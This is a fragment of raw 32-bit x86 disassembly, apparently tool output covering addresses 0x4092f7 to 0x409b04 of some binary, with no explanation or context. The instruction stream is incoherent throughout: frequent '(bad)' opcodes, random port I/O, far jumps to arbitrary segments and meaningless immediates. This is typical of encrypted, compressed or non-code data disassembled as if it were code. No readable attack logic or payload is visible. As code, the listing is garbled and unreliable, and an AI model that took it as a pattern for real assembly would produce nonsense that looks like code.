  4092f7:	ja     0x4092ee
  4092f9:	adc    esi,DWORD PTR [ebx+0x33f2bd8f]
  4092ff:	pop    esp
  409300:	sbb    DWORD PTR [ebp+0x63],edx
  409303:	jae    0x409375
  409305:	mov    ?,WORD PTR [ecx]
  409307:	mov    al,0x47
  409309:	and    eax,DWORD PTR [edi]
  40930b:	mov    al,0xd6
  40930d:	add    cl,ch
  40930f:	test   al,0xb8
  409311:	xor    cl,dh
  409313:	je     0x4092f4
  409315:	int    0x78
  409317:	ror    bl,1
  409319:	fsub   DWORD PTR [esi-0x4c]
  40931c:	stc    
  40931d:	test   BYTE PTR [edi+0x67],ch
  409320:	jge    0x4092e9
  409322:	cmp    ecx,DWORD PTR [eax+0x3d2e225]
  409328:	or     bl,BYTE PTR [edi-0x79]
  40932b:	stos   BYTE PTR es:[edi],al
  40932c:	adc    DWORD PTR [esi],ecx
  40932e:	sbb    eax,0xbade238
  409333:	repnz or edx,esi
  409336:	jo     0x40935a
  409338:	sub    DWORD PTR [edx+0x5221af11],ebx
  40933e:	loope  0x4092ef
  409340:	jbe    0x409319
  409342:	mov    esi,0x9a07ef3a
  409347:	frstor [eax]
  409349:	adc    eax,0x76e6519d
  40934e:	in     eax,0xe6
  409350:	dec    edi
  409351:	repz dec ebx
  409353:	aaa    
  409354:	cmp    BYTE PTR [ebx-0x4573b083],0x3f
  40935b:	push   edx
  40935c:	mov    al,ds:0x7fc1d890
  409361:	ins    BYTE PTR es:[edi],dx
  409362:	pusha  
  409363:	mov    ebp,0xe784e31a
  409368:	arpl   WORD PTR ds:0x218a7c20,sp
  40936e:	sbb    BYTE PTR [ecx],bl
  409370:	rcr    BYTE PTR [ebx+0x49],0x26
  409374:	stos   DWORD PTR es:[edi],eax
  409375:	add    al,BYTE PTR [edi-0x40]
  409378:	xchg   ecx,eax
  409379:	loopne 0x409351
  40937b:	and    al,0xa7
  40937d:	and    eax,0xd9683aae
  409382:	mul    esi
  409384:	lds    esi,FWORD PTR [eax-0x38fdd831]
  40938a:	or     dh,BYTE PTR ds:0x5d4dcb87
  409390:	adc    eax,0x2b87a96d
  409395:	aad    0xf2
  409397:	add    edx,DWORD PTR [ecx-0x689de69a]
  40939d:	fwait
  40939e:	dec    edi
  40939f:	imul   DWORD PTR [ecx-0x51]
  4093a2:	fs cmc 
  4093a4:	nop
  4093a5:	mov    eax,ds:0xe7ad5ad
  4093aa:	fnstcw WORD PTR [edi-0x58]
  4093ad:	jo     0x4093a6
  4093af:	xor    DWORD PTR [ebx-0x11],ebx
  4093b2:	or     bl,bl
  4093b4:	sbb    eax,0xcc1a9681
  4093b9:	imul   ebp,DWORD PTR [ebp+0x72],0xfffffff3
  4093bd:	call   0x8ee2:0xee1b3027
  4093c4:	adc    DWORD PTR [ecx+0x63c9f817],ecx
  4093ca:	and    DWORD PTR [ecx+0x423888e9],0xd74cd10d
  4093d4:	add    al,BYTE PTR [edi+0x4c4733a4]
  4093da:	shl    DWORD PTR fs:[ebx],1
  4093dd:	push   0x6055b2bc
  4093e2:	fs inc ecx
  4093e4:	xchg   esp,eax
  4093e5:	mov    WORD PTR [esi-0x20286de4],cs
  4093eb:	jecxz  0x40943c
  4093ed:	shl    BYTE PTR [ebp+ebx*1+0x4a],cl
  4093f1:	mov    esp,0xb4905fba
  4093f6:	outs   dx,DWORD PTR ds:[esi]
  4093f7:	call   0x45fa278e
  4093fc:	stos   BYTE PTR es:[edi],al
  4093fd:	inc    edi
  4093fe:	xor    edx,eax
  409400:	pop    ecx
  409401:	add    eax,0xc716d240
  409406:	daa    
  409407:	cmp    dl,BYTE PTR [edi-0x36]
  40940a:	cmp    dl,BYTE PTR [edx+0x4767522]
  409410:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409411:	(bad)  
  409412:	dec    esi
  409413:	cli    
  409414:	repz or al,0xd8
  409417:	rol    DWORD PTR [ecx+0x13a72911],cl
  40941d:	xor    DWORD PTR [eax],edi
  40941f:	aaa    
  409420:	jne    0x4093d6
  409422:	sub    bh,dh
  409424:	lahf   
  409425:	mov    edi,0xfdffd8f2
  40942a:	inc    edx
  40942b:	inc    esp
  40942c:	cdq    
  40942d:	rcl    DWORD PTR [ecx-0x298f28b2],0x3e
  409434:	div    al
  409436:	(bad)  
  409437:	aad    0x23
  409439:	addr16 lahf 
  40943b:	call   FWORD PTR [edx+ebp*1-0x11]
  40943f:	inc    ebx
  409440:	add    cl,BYTE PTR [edi]
  409442:	cmp    BYTE PTR [eax+0xf3ad3ef],ch
  409448:	jg     0x409411
  40944a:	mov    edi,0xcc52cc8
  40944f:	(bad)  
  409450:	mov    bh,0x2a
  409452:	adc    esp,DWORD PTR [ecx+0x3c5bad29]
  409458:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409459:	sub    BYTE PTR [edi-0x75],ah
  40945c:	fisubr DWORD PTR [ebp+0x6c]
  40945f:	sbb    DWORD PTR [ebx-0x70],edi
  409462:	out    dx,al
  409463:	fsub   QWORD PTR [eax+0x67e8aff5]
  409469:	sub    eax,0xd08a7279
  40946e:	nop
  40946f:	out    dx,al
  409470:	mov    BYTE PTR [edx+0x4e],ah
  409473:	call   0xec4ef09e
  409478:	shl    BYTE PTR [esi-0x8508c34],0xcc
  40947f:	pop    edx
  409480:	sub    BYTE PTR [edx+0x27],dh
  409483:	adc    al,0x25
  409485:	jp     0x40942b
  409487:	xchg   esi,eax
  409488:	sbb    eax,0x1e127c72
  40948d:	and    cl,dl
  40948f:	test   al,0x93
  409491:	add    DWORD PTR [esi*1+0x53ffd176],esp
  409498:	sbb    eax,0x44361790
  40949d:	sub    ch,BYTE PTR [eax+0x3c58d305]
  4094a3:	xchg   cl,cl
  4094a5:	push   edx
  4094a6:	das    
  4094a7:	inc    ecx
  4094a8:	jnp    0x40943d
  4094aa:	in     eax,dx
  4094ab:	xchg   al,bl
  4094ad:	push   esp
  4094ae:	imul   ebp,DWORD PTR [ebx],0xfffffff4
  4094b1:	push   ebx
  4094b2:	xlat   BYTE PTR ds:[ebx]
  4094b3:	lock daa 
  4094b5:	dec    ebx
  4094b6:	push   ecx
  4094b7:	sbb    ebp,eax
  4094b9:	ficomp DWORD PTR [edx]
  4094bb:	xor    cl,BYTE PTR [ecx+eax*8-0x3e]
  4094bf:	jp     0x409442
  4094c1:	js     0x40950b
  4094c3:	lock and DWORD PTR [ebp-0x77adc450],esi
  4094ca:	push   eax
  4094cb:	jne    0x4094c8
  4094cd:	xor    BYTE PTR ds:0xc262d634,ah
  4094d3:	adc    bh,BYTE PTR [edx]
  4094d5:	lods   al,BYTE PTR ds:[esi]
  4094d6:	sbb    eax,0x10174b44
  4094db:	adc    esp,esp
  4094dd:	ret    
  4094de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094df:	nop
  4094e0:	lock loopne 0x40953b
  4094e3:	arpl   WORD PTR [esi-0x323f5e89],dx
  4094e9:	xor    dh,dh
  4094eb:	enter  0xbac3,0x7b
  4094ef:	add    BYTE PTR [ecx],ah
  4094f1:	inc    ebp
  4094f2:	cmc    
  4094f3:	nop
  4094f4:	fbld   TBYTE PTR [edx-0x51e10dcf]
  4094fa:	out    0xcf,eax
  4094fc:	inc    ebx
  4094fd:	mov    bl,0x3
  4094ff:	hlt    
  409500:	lods   eax,DWORD PTR ds:[esi]
  409501:	jle    0x409493
  409503:	push   ebp
  409504:	mov    ds:0x9529f362,al
  409509:	mov    eax,0x949171c6
  40950e:	xchg   ebp,eax
  40950f:	lds    edi,FWORD PTR [ecx+0x73e3e87]
  409515:	and    bh,BYTE PTR [edx-0x27]
  409518:	(bad)  
  409519:	dec    ebx
  40951a:	pop    edx
  40951b:	push   esp
  40951c:	push   0x45
  40951e:	lahf   
  40951f:	fs xor al,0x12
  409522:	mov    edx,0x7a57016a
  409527:	add    BYTE PTR [edx+0x69fddcba],dl
  40952d:	or     al,ah
  40952f:	nop
  409530:	or     bl,BYTE PTR [eax]
  409532:	test   eax,0x74b63f4a
  409537:	jl     0x409566
  409539:	or     ecx,DWORD PTR [esi]
  40953b:	pop    ecx
  40953c:	cmp    DWORD PTR [eax+0x58],ebx
  40953f:	rcr    ebp,0x6c
  409542:	fnsave [ecx+0x46]
  409545:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409546:	push   ebp
  409547:	inc    esp
  409548:	sub    eax,0xaaf75294
  40954d:	jo     0x4095c9
  40954f:	mov    ch,0x2
  409551:	push   edi
  409552:	lahf   
  409553:	mov    WORD PTR [edx+0x56d6494c],cs
  409559:	adc    al,0x8c
  40955b:	cmp    DWORD PTR [edx-0x68],ebp
  40955e:	jge    0x409562
  409560:	je     0x4095c5
  409562:	(bad)  
  409563:	lds    ebx,FWORD PTR [edi]
  409565:	test   al,0xba
  409567:	pop    es
  409568:	push   ecx
  409569:	add    eax,ebx
  40956b:	(bad)  
  40956c:	pop    eax
  40956d:	in     al,0xb8
  40956f:	or     DWORD PTR [edx],esi
  409571:	xchg   edi,eax
  409572:	adc    al,0xe4
  409574:	mov    eax,ds:0xae1a5c66
  409579:	scas   al,BYTE PTR es:[edi]
  40957a:	mov    ebx,0x9a9d128a
  40957f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409581:	xchg   ecx,eax
  409582:	adc    bh,BYTE PTR [edx+0x2d7f343]
  409588:	xchg   ecx,eax
  409589:	pextrw edi,(bad),0xc5
  40958b:	js     0x4095a6
  40958d:	cmp    cl,cl
  40958f:	push   eax
  409590:	pusha  
  409591:	loop   0x409552
  409593:	jbe    0x40959f
  409595:	cwde   
  409596:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409597:	xchg   DWORD PTR [ebx],edi
  409599:	xor    DWORD PTR [esi+0x392987e7],ebp
  40959f:	retf   
  4095a0:	jle    0x4095ae
  4095a2:	xor    al,0xef
  4095a4:	imul   ecx,DWORD PTR fs:0xb6d41e5e,0x2cfdc4ba
  4095af:	jmp    0x2da4:0x53fafd14
  4095b6:	out    dx,al
  4095b7:	xor    al,0xab
  4095b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095ba:	fucomi st,st(6)
  4095bc:	je     0x4095d3
  4095be:	popf   
  4095bf:	pop    ebx
  4095c0:	add    BYTE PTR [esi+0x3f],dl
  4095c3:	retf   
  4095c4:	lds    edi,FWORD PTR [ecx+eiz*4+0x6a]
  4095c8:	mov    ds:0x53ce6749,eax
  4095cd:	lods   al,BYTE PTR ds:[esi]
  4095ce:	adc    cl,BYTE PTR [ebp+0x48]
  4095d1:	repnz inc edi
  4095d3:	sub    al,0x3d
  4095d5:	dec    edi
  4095d6:	mov    al,0x16
  4095d8:	nop
  4095d9:	sbb    eax,0x72fa816f
  4095de:	test   bh,ch
  4095e0:	addr16 test eax,0xa4f25bca
  4095e6:	and    ebx,DWORD PTR [esi+0x4a]
  4095e9:	mov    cl,0x3b
  4095eb:	loopne 0x409637
  4095ed:	inc    esp
  4095ee:	xchg   esp,eax
  4095ef:	into   
  4095f0:	mov    bl,0xcc
  4095f2:	hlt    
  4095f3:	arpl   WORD PTR [ebx],ax
  4095f5:	jo     0x4095d4
  4095f7:	mov    eax,0x499ceb20
  4095fc:	lock xchg esi,eax
  4095fe:	ds call 0x117:0xd4913a59
  409606:	dec    esp
  409607:	arpl   WORD PTR [eax],bx
  409609:	fld    DWORD PTR [edi-0x1f]
  40960c:	repnz test eax,0x66386355
  409612:	fwait
  409613:	adc    ah,0xdc
  409616:	add    BYTE PTR [edx],al
  409618:	fndisi(8087 only) 
  40961a:	jbe    0x409635
  40961c:	dec    esi
  40961d:	pop    ebx
  40961e:	adc    al,0xb
  409620:	adc    al,BYTE PTR [ebp+0x74]
  409623:	fisub  DWORD PTR [eax-0x5a]
  409626:	mov    ebx,0x7b468c64
  40962b:	std    
  40962c:	sub    edi,esp
  40962e:	shl    DWORD PTR [ecx-0x50],1
  409631:	(bad)  
  409632:	sub    DWORD PTR [edx],ecx
  409634:	jmp    0x4096b0
  409636:	mov    bl,0xa7
  409638:	clc    
  409639:	in     al,dx
  40963a:	cmp    al,bh
  40963c:	(bad)  
  40963d:	fs sahf 
  40963f:	push   ss
  409640:	popa   
  409641:	jmp    0xbc78:0xa29cd6eb
  409648:	fiadd  WORD PTR [eax+0x5c14a16c]
  40964e:	fs xchg esp,esp
  409651:	sub    al,0x5d
  409653:	sub    dh,ch
  409655:	xor    eax,0x5ccf945d
  40965a:	test   ecx,0x6fe5f755
  409660:	xchg   ecx,eax
  409661:	sub    eax,0xd9139de0
  409666:	dec    edx
  409667:	pop    esi
  409668:	in     eax,dx
  409669:	cmp    DWORD PTR [ecx-0xae31ea5],0xffffff81
  409670:	pushf  
  409671:	(bad)  
  409672:	je     0x409637
  409674:	fsub   QWORD PTR [ebx+0x38]
  409677:	jo     0x40964d
  409679:	sub    eax,0x1e433adb
  40967e:	ficom  WORD PTR [ebx-0x2e]
  409681:	cmp    edi,0x6a
  409684:	fucomip st,st(3)
  409686:	sbb    eax,0xc5e883fd
  40968b:	adc    BYTE PTR [esp+ebx*2+0x5c],bl
  40968f:	test   BYTE PTR [eax-0x40],al
  409692:	push   ebx
  409693:	xor    DWORD PTR [ebx-0x2d],0xffffffb4
  409697:	ins    DWORD PTR es:[edi],dx
  409698:	je     0x409626
  40969a:	js     0x409635
  40969c:	int    0xea
  40969e:	repz mov fs,WORD PTR [eax]
  4096a1:	std    
  4096a2:	add    eax,0x8b6c69d0
  4096a7:	cli    
  4096a8:	leave  
  4096a9:	rcl    DWORD PTR ds:0xfbbd3b94,0xec
  4096b0:	inc    edx
  4096b1:	fiadd  DWORD PTR [ebp-0x58]
  4096b4:	sub    esi,DWORD PTR cs:[ecx-0x1b]
  4096b8:	outs   dx,BYTE PTR ds:[esi]
  4096b9:	ret    
  4096ba:	sbb    ecx,DWORD PTR [ebx]
  4096bc:	jp     0x40966d
  4096be:	es inc ebx
  4096c0:	xor    ah,ch
  4096c2:	push   esi
  4096c3:	or     eax,0x2db6f982
  4096c8:	inc    edi
  4096c9:	push   ebp
  4096ca:	jbe    0x409722
  4096cc:	retf   0xb036
  4096cf:	shl    DWORD PTR [ecx+0x6a054150],1
  4096d5:	mov    eax,ds:0x8e2b449e
  4096da:	mov    ebx,0xb61d2e9f
  4096df:	fistp  DWORD PTR [ecx+0x7a4f821e]
  4096e5:	setg   BYTE PTR [ebx+ebp*2]
  4096e9:	out    dx,eax
  4096ea:	jp     0x4096d6
  4096ec:	dec    edx
  4096ed:	test   DWORD PTR [edx-0x15],0x5b4d0954
  4096f4:	aad    0x89
  4096f6:	idiv   esi
  4096f8:	out    dx,al
  4096f9:	mov    bh,dh
  4096fb:	add    al,0xa3
  4096fd:	mov    esi,ebp
  4096ff:	xchg   edi,eax
  409700:	fdivr  QWORD PTR [ecx]
  409702:	aas    
  409703:	xor    edx,DWORD PTR [eax*2-0x4dea243e]
  40970a:	xchg   edi,eax
  40970b:	mov    dh,0x80
  40970d:	dec    esp
  40970e:	mov    bh,0x48
  409710:	jp     0x40978f
  409712:	sub    eax,0xf42a7cbf
  409717:	and    DWORD PTR [ebx],ebp
  409719:	lods   eax,DWORD PTR ds:[esi]
  40971a:	inc    ebp
  40971b:	push   cs
  40971c:	aaa    
  40971d:	dec    eax
  40971e:	das    
  40971f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409720:	mov    bl,BYTE PTR [edx+0x1a7e9190]
  409726:	xor    cl,BYTE PTR [ebp-0x6e2f2040]
  40972c:	dec    edi
  40972d:	inc    ebp
  40972e:	mov    esp,0x223b586e
  409733:	jno    0x409732
  409735:	nop
  409736:	in     al,dx
  409737:	dec    BYTE PTR [edi-0x281a1cfb]
  40973d:	xchg   DWORD PTR [ebx],esi
  40973f:	cld    
  409740:	je     0x4096c7
  409742:	lds    edi,FWORD PTR [ebx-0x32]
  409745:	add    ebx,DWORD PTR [ecx-0x6e8349ec]
  40974b:	test   al,0xf0
  40974d:	(bad)  
  40974e:	adc    al,0x7b
  409750:	ja     0x40974a
  409752:	sub    al,BYTE PTR [edx+0x5b9fd60c]
  409758:	add    DWORD PTR [ebx],edi
  40975a:	inc    ebp
  40975b:	arpl   WORD PTR [edi+0x44e43f94],sp
  409761:	pop    edi
  409762:	cmp    BYTE PTR [ecx+0xa9df789],al
  409768:	xchg   BYTE PTR [ebp-0x51c46029],ch
  40976e:	push   es
  40976f:	fsub   DWORD PTR [eax+ecx*4-0x59]
  409773:	retf   
  409774:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409775:	cmp    dh,bh
  409777:	cmp    ebp,edi
  409779:	mov    bl,0x45
  40977b:	daa    
  40977c:	fnstcw WORD PTR [esi+eax*1-0x14]
  409780:	(bad)  
  409781:	mov    ch,0xfa
  409783:	(bad)  
  409784:	fild   DWORD PTR [eax+0x42]
  409787:	inc    edi
  409788:	cwde   
  409789:	mov    eax,DWORD PTR [ebp+0x3cd7c5e5]
  40978f:	rol    BYTE PTR [edx-0x1e60c89e],0xcf
  409796:	push   ds
  409797:	and    DWORD PTR [edi],esp
  409799:	loopne 0x40972a
  40979b:	ret    
  40979c:	in     eax,dx
  40979d:	cmp    eax,0x782af694
  4097a2:	and    DWORD PTR [ecx-0x4b],ecx
  4097a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097a6:	mov    bh,0xda
  4097a8:	das    
  4097a9:	sbb    DWORD PTR [esi],0xffffff82
  4097ac:	jmp    0xe0a0d332
  4097b1:	jmp    0xf3f6:0x81c56fa2
  4097b8:	push   bp
  4097ba:	push   ebx
  4097bb:	mov    dh,0xd9
  4097bd:	lea    ecx,[esi-0xafe14a3]
  4097c3:	neg    DWORD PTR [esi]
  4097c5:	scas   al,BYTE PTR es:[edi]
  4097c6:	dec    edx
  4097c7:	repnz retf 
  4097c9:	sbb    ebp,DWORD PTR [ebp+0x38339d38]
  4097cf:	push   0x0
  4097d1:	inc    ebx
  4097d2:	jmp    0x660a:0x6d67fc28
  4097d9:	lock vdivps ymm1,ymm7,YMMWORD PTR [ecx+edx*8-0x6d42c2e9]
  4097e3:	cdq    
  4097e4:	call   0x1d2c3a82
  4097e9:	jbe    0x4097e5
  4097eb:	(bad)  
  4097ec:	test   DWORD PTR [esi+0x68],0xb8668818
  4097f3:	sub    al,0xf6
  4097f5:	leave  
  4097f6:	mov    ah,BYTE PTR [ebx+edx*1+0x21]
  4097fa:	mov    ch,0x93
  4097fc:	push   0x4910b789
  409801:	(bad)  
  409802:	and    al,0x5f
  409804:	and    BYTE PTR ds:[ebp-0x1d7ad345],bl
  40980b:	bound  edx,QWORD PTR ds:0xf4f0a82c
  409811:	push   ecx
  409812:	pop    edi
  409813:	cmp    DWORD PTR [ebx-0x29],edi
  409816:	xor    BYTE PTR [eax],al
  409818:	xchg   ebp,eax
  409819:	sbb    BYTE PTR [ebp-0x74222552],0x62
  409820:	inc    ebp
  409821:	dec    edx
  409822:	xchg   esi,eax
  409823:	mov    esp,0x39a6e667
  409828:	test   al,0x32
  40982a:	and    BYTE PTR [ebx+ecx*4-0x48],al
  40982e:	fadd   st,st(1)
  409830:	sbb    dh,BYTE PTR [ebx]
  409832:	xchg   BYTE PTR [ecx+ecx*2-0x39],dl
  409836:	cmp    dh,ch
  409838:	pop    ebp
  409839:	sahf   
  40983a:	das    
  40983b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40983c:	xor    al,0x56
  40983e:	or     BYTE PTR [esi],bl
  409840:	push   0xb192c5e
  409845:	add    DWORD PTR [eiz*4-0x7b1962c2],ecx
  40984c:	sti    
  40984d:	dec    ebp
  40984e:	emms   
  409850:	or     bh,BYTE PTR [ebp+0x3d]
  409853:	xor    eax,0x6625092f
  409858:	sbb    eax,0xcb916893
  40985d:	aas    
  40985e:	sub    dl,BYTE PTR [edi]
  409860:	repz mov ebp,0xd02e97bc
  409866:	hlt    
  409867:	push   ecx
  409868:	or     bl,BYTE PTR ds:[ebx+0x6b]
  40986c:	jle    0x40986b
  40986e:	xchg   BYTE PTR [ebp-0x7a],ch
  409871:	in     eax,0x85
  409873:	xor    ebx,DWORD PTR [ebx+0x47]
  409876:	cmp    al,0x11
  409878:	loope  0x409864
  40987a:	xor    BYTE PTR [eax-0x68],dl
  40987d:	jne    0x409833
  40987f:	stos   BYTE PTR es:[edi],al
  409880:	cli    
  409881:	addr16 adc al,0x7c
  409884:	(bad)  
  409885:	loope  0x409869
  409887:	imul   sp,si,0x8438
  40988c:	shl    ebx,cl
  40988e:	retf   
  40988f:	call   0xd282:0x67b9c39d
  409896:	stos   BYTE PTR es:[edi],al
  409897:	and    DWORD PTR [edi+ebp*4-0x7415cd9e],ebx
  40989e:	add    dh,ch
  4098a0:	repnz adc DWORD PTR [ecx],ebp
  4098a3:	or     ah,BYTE PTR [ecx-0x1800055]
  4098a9:	pop    es
  4098aa:	and    bl,ch
  4098ac:	retf   0x6904
  4098af:	loopne 0x40986b
  4098b1:	test   al,0x2c
  4098b3:	(bad)  
  4098b4:	ret    
  4098b5:	stos   BYTE PTR es:[edi],al
  4098b6:	inc    ebp
  4098b7:	pop    es
  4098b8:	js     0x409857
  4098ba:	fs push esi
  4098bc:	add    al,0x5f
  4098be:	adc    bh,BYTE PTR [edi]
  4098c0:	jae    0x40989d
  4098c2:	(bad)  
  4098c3:	fld    DWORD PTR [ebp+0x5f]
  4098c6:	jnp    0x40988b
  4098c8:	rcr    DWORD PTR [ecx],1
  4098ca:	jmp    0xdfaf:0x63e1e470
  4098d1:	cmp    esp,DWORD PTR [ecx+0x439329a2]
  4098d7:	ret    0x12f1
  4098da:	push   edi
  4098db:	out    dx,al
  4098dc:	in     eax,0x72
  4098de:	inc    edx
  4098df:	sub    eax,DWORD PTR ds:0x2d8d6244
  4098e5:	push   ecx
  4098e6:	or     al,0xcb
  4098e8:	sub    ecx,DWORD PTR [ecx-0x76]
  4098eb:	sub    bh,BYTE PTR [edi]
  4098ed:	mov    al,0x3e
  4098ef:	dec    edx
  4098f0:	xor    DWORD PTR [edi],ebx
  4098f2:	lods   eax,DWORD PTR ds:[esi]
  4098f3:	rol    DWORD PTR [esi-0x7137b2bb],1
  4098f9:	cmp    cl,BYTE PTR [edi-0x42]
  4098fc:	sub    eax,DWORD PTR ds:0x8b7a14e1
  409902:	and    al,0x65
  409904:	sbb    edi,DWORD PTR [eax+0x6a]
  409907:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409908:	in     eax,0x87
  40990a:	call   esi
  40990c:	cs jae 0x409909
  40990f:	mov    ebx,0x7c622a3a
  409914:	or     ebp,DWORD PTR [edx]
  409916:	call   0xfa90:0xbfb0f8ec
  40991d:	pop    ecx
  40991e:	push   es
  40991f:	xlat   BYTE PTR ds:[ebx]
  409920:	dec    esi
  409921:	mov    eax,ds:0x8dade8
  409926:	inc    ebx
  409927:	aaa    
  409928:	inc    esp
  409929:	fs xor eax,0x1c949d5b
  40992f:	in     eax,0x36
  409931:	cdq    
  409932:	dec    ebp
  409933:	mov    eax,ds:0xcb39c5b8
  409938:	sbb    DWORD PTR [ebx+ebp*4-0x34afded5],0x62c3ad88
  409943:	fistp  WORD PTR [esi+0x794e2980]
  409949:	cmp    BYTE PTR es:[ebx],0x91
  40994d:	pop    edi
  40994e:	repz adc dl,BYTE PTR [esi+eiz*1]
  409952:	add    DWORD PTR [ecx-0x7ac575f9],edx
  409958:	xor    BYTE PTR [eax],0xea
  40995b:	mov    ebx,0xd68e2880
  409960:	mov    ebp,0x90dc9e2b
  409965:	std    
  409966:	ds int3 
  409968:	aaa    
  409969:	and    al,0xc2
  40996b:	mov    eax,ds:0xbfd3b4fa
  409970:	gs jno 0x40997b
  409973:	jae    0x4099ec
  409975:	outs   dx,DWORD PTR ds:[si]
  409977:	jb     0x4099f1
  409979:	pop    edi
  40997a:	jecxz  0x409947
  40997c:	xor    dh,dl
  40997e:	jno    0x4099ea
  409980:	push   ebx
  409981:	test   eax,0xdfaef94f
  409986:	mov    eax,0x76daad7c
  40998b:	mov    ebp,0x27aa204
  409990:	jb     0x40993c
  409992:	repz imul esi,DWORD PTR [eax],0x6e8635ca
  409999:	add    eax,0xaee5bdda
  40999e:	in     al,0x6b
  4099a0:	int    0x2e
  4099a2:	push   esp
  4099a3:	cwde   
  4099a4:	sar    BYTE PTR [eax],0xec
  4099a7:	pusha  
  4099a8:	cmp    dh,bl
  4099aa:	pop    ss
  4099ab:	mov    ebx,0xba34387
  4099b0:	ds aas 
  4099b2:	cmp    al,0x2
  4099b4:	jno    0x409982
  4099b6:	mov    al,0x4f
  4099b8:	pop    ecx
  4099b9:	fild   WORD PTR [eax-0x5]
  4099bc:	imul   edx,DWORD PTR [ebp+0x879703e],0xffffffa8
  4099c3:	ins    DWORD PTR es:[edi],dx
  4099c4:	sbb    BYTE PTR ds:0xdcb7011d,0xa9
  4099cb:	mov    edx,0x5c757fb1
  4099d0:	hlt    
  4099d1:	add    esi,DWORD PTR [edx-0x7f]
  4099d4:	sub    ecx,esp
  4099d6:	lock rcr DWORD PTR [eax-0x67],1
  4099da:	and    DWORD PTR [edi+0x12],0x23
  4099de:	test   al,0x51
  4099e0:	int3   
  4099e1:	cmp    ebp,0x52
  4099e4:	push   edx
  4099e5:	outs   dx,DWORD PTR cs:[esi]
  4099e7:	jl     0x40996e
  4099e9:	jns    0x4099a5
  4099eb:	xchg   BYTE PTR [edx+0x7c9e3f5e],al
  4099f1:	fistp  DWORD PTR [esp]
  4099f4:	jl     0x409a56
  4099f6:	xchg   ebp,eax
  4099f7:	dec    ebx
  4099f8:	sbb    cl,BYTE PTR [esi+0x7f]
  4099fb:	mov    al,ds:0x1a414bac
  409a00:	dec    edi
  409a01:	leave  
  409a02:	leave  
  409a03:	add    eax,0x3103a1ac
  409a08:	outs   dx,BYTE PTR ds:[esi]
  409a09:	xchg   ebp,eax
  409a0a:	add    BYTE PTR [ebx+0x1f],dl
  409a0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a0e:	push   ss
  409a0f:	rcr    ch,1
  409a11:	push   ds
  409a12:	mov    ebx,0x85f3a7b2
  409a17:	xor    edi,ebp
  409a19:	push   ebx
  409a1a:	nop
  409a1b:	or     BYTE PTR [ecx+0x9],dl
  409a1e:	jmp    0x409a4d
  409a20:	idiv   BYTE PTR [ebx+ebx*2]
  409a23:	pop    edi
  409a24:	mov    ch,0xf2
  409a26:	jbe    0x409aa3
  409a28:	pop    es
  409a29:	(bad)  
  409a2a:	push   esi
  409a2b:	mov    esi,0xab3c9c26
  409a30:	loop   0x409a35
  409a32:	(bad)  [edi+ebx*8]
  409a35:	in     al,0xc8
  409a37:	das    
  409a38:	std    
  409a39:	sbb    ch,BYTE PTR [edx-0x6bc3fa5a]
  409a3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a40:	add    eax,0xf5e40578
  409a45:	popa   
  409a46:	jecxz  0x409a6d
  409a48:	cwde   
  409a49:	cld    
  409a4a:	jb     0x409a65
  409a4c:	ficomp DWORD PTR [ebp-0x4a]
  409a4f:	int3   
  409a50:	and    eax,0x6777b286
  409a55:	adc    DWORD PTR [edx],0xffffffee
  409a58:	xor    bh,bh
  409a5a:	addr16 pop edi
  409a5c:	cmc    
  409a5d:	push   edx
  409a5e:	mov    esp,0xb2b10095
  409a63:	xchg   DWORD PTR [ebp+eiz*1-0x27],esi
  409a67:	or     bl,BYTE PTR [ecx+0x77]
  409a6a:	pop    edx
  409a6b:	pop    esp
  409a6c:	and    BYTE PTR [esi-0x108b58e1],dh
  409a72:	and    eax,0xca882ae6
  409a77:	inc    esp
  409a78:	fdiv   QWORD PTR [edx+0xb86a957]
  409a7e:	in     eax,0xab
  409a80:	xchg   ebp,eax
  409a81:	mov    fs:0x9d79ffc9,eax
  409a87:	std    
  409a88:	jecxz  0x409a95
  409a8a:	push   edx
  409a8b:	(bad)  
  409a8c:	and    al,BYTE PTR ds:0x6a7cb790
  409a92:	sub    ecx,DWORD PTR [edx]
  409a94:	adc    DWORD PTR [ebp+0x57],esp
  409a97:	inc    ecx
  409a98:	jnp    0x409ad6
  409a9a:	mov    al,ds:0x9e9d80ff
  409a9f:	sbb    al,0x3d
  409aa1:	sbb    al,BYTE PTR [ecx-0x1e]
  409aa4:	in     eax,0xa9
  409aa6:	mov    esp,0xac3b9216
  409aab:	test   eax,0xcd5f808
  409ab0:	xor    eax,0xf6d44e37
  409ab5:	inc    ecx
  409ab6:	iret   
  409ab7:	mov    dl,0xab
  409ab9:	push   esi
  409aba:	mov    dh,0x8a
  409abc:	ds sahf 
  409abe:	cwde   
  409abf:	jl     0x409a6b
  409ac1:	mov    al,ds:0x8ec32563
  409ac6:	shl    DWORD PTR [eax-0x7c847758],0x9b
  409acd:	jo     0x409a59
  409acf:	add    eax,0xc2cb80d4
  409ad4:	test   al,0x87
  409ad6:	dec    edi
  409ad7:	push   esp
  409ad8:	sub    al,0xe5
  409ada:	adc    BYTE PTR [edx],0xa5
  409add:	add    dl,cl
  409adf:	mov    cl,0xcf
  409ae1:	add    esp,DWORD PTR [ebp-0xb]
  409ae4:	popa   
  409ae5:	pop    esi
  409ae6:	dec    edi
  409ae7:	pop    ebx
  409ae8:	clc    
  409ae9:	iret   
  409aea:	add    DWORD PTR [esi-0x8],0x5f
  409aee:	jno    0x409b5f
  409af0:	jbe    0x409abd
  409af2:	sbb    DWORD PTR [edx],edi
  409af4:	fild   DWORD PTR [ebp+0x4]
  409af7:	pop    ds
  409af8:	dec    eax
  409af9:	daa    
  409afa:	ret    0x3d96
  409afd:	add    DWORD PTR [edx-0x47a24668],esi
  409b03:	das    
  409b04:	repnz fld TBYTE PTR [ecx-0x50]
